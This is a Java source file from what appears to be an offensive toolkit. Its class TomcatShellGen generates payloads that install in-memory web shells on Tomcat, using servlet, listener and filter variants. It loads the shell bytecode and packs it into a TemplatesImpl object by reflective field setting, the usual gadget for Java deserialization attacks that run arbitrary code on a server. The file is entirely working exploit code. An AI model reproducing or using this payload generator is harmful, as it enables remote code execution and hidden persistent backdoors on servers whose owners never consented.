package cn.org.unk.memshell.tomcat;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import cn.org.unk.Util;
import java.io.InputStream;
import java.lang.reflect.Field;

public class TomcatShellGen {

    public static TemplatesImpl servletShell() throws Exception{
        return doGen("ServletShell.class");
    }
    public static TemplatesImpl listenerShell() throws Exception{
        return doGen("ListenerShell.class");
    }
    public static TemplatesImpl filterShell() throws Exception{
        return doGen("FilterShell.class");
    }
    public static byte[] servletShellCode() throws Exception{
        InputStream resourceAsStream = TomcatShellGen.class.getResourceAsStream("ServletShell.class");
        return Util.inputStream2ByteArray(resourceAsStream);
    }
    public static byte[] listenerShellCode() throws Exception{
        InputStream resourceAsStream = TomcatShellGen.class.getResourceAsStream("ListenerShell.class");
        return Util.inputStream2ByteArray(resourceAsStream);
    }
    public static byte[] filterShellCode() throws Exception{
        InputStream resourceAsStream = TomcatShellGen.class.getResourceAsStream("FilterShell.class");
        return Util.inputStream2ByteArray(resourceAsStream);
    }
    private static TemplatesImpl doGen(String shellClass) throws Exception{
        InputStream resourceAsStream = TomcatShellGen.class.getResourceAsStream(shellClass);
        byte[] code = Util.inputStream2ByteArray(resourceAsStream);
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field bytecodes = clazz.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        TemplatesImpl o = new TemplatesImpl();
        byte[][] b = new byte[][]{code};
        bytecodes.set(o, b);
        Field _name = clazz.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(o, "Hello");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(o, new TransformerFactoryImpl());
        Field _transletIndex = clazz.getDeclaredField("_transletIndex");
        _transletIndex.setAccessible(true);
        _transletIndex.set(o, 0);
        return o;
    }
}
